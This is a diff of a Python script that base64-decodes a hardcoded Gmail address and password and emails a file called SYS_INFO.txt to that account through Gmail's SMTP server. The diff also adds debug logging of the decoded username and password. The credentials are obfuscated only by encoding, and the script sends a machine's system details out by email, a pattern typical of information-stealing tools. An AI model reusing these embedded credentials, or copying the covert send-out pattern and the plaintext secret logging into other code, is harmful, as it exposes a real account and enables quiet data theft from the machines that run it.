@@ -3,15 +3,19 @@ import codecs
 import logging
 from email.message import EmailMessage
 
-logging.basicConfig(filename="winfo.log", filemode="a", level=logging.DEBUG)
+logging.basicConfig(filename="winfo.log", filemode="a", level=logging.ERROR)
 
 USER = b"bG9nYW5rZGV2ZW1haWxAZ21haWwuY29t"
 PASS = b"Z2h3aSB1bHhuIHB6YnIgem56dw=="
 SYS_INFO = "SYS_INFO.txt"
-
+decUser = codecs.decode(USER, "base64")
+decPass = codecs.decode(PASS, "base64")
+username = bytes.decode(decUser, encoding='utf-8', errors='strict')
+password = bytes.decode(decPass, encoding='utf-8', errors='strict')
+    
 email = EmailMessage()
 email["from"] = "SYS_INFO"
-email["to"] = codecs.decode(USER, "base64")
+email["to"] = username
 email["subject"] = "SYSINFO"
 
 
@@ -26,12 +30,12 @@ def cast_file_to_message(file):
 
 def send_mail():
     """Send email."""
-    decUser = str(codecs.decode(USER, "base64"))
-    decPass = str(codecs.decode(PASS, "base64"))
+    logging.debug(f'{username}')
+    logging.debug(f'{password}')
     with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
         smtp.ehlo()
         smtp.starttls()
-        smtp.login(decUser, decPass)
+        smtp.login(username, password)
         smtp.send_message(email)
         logging.debug("Message sent!")
         print("Message sent successfully!")
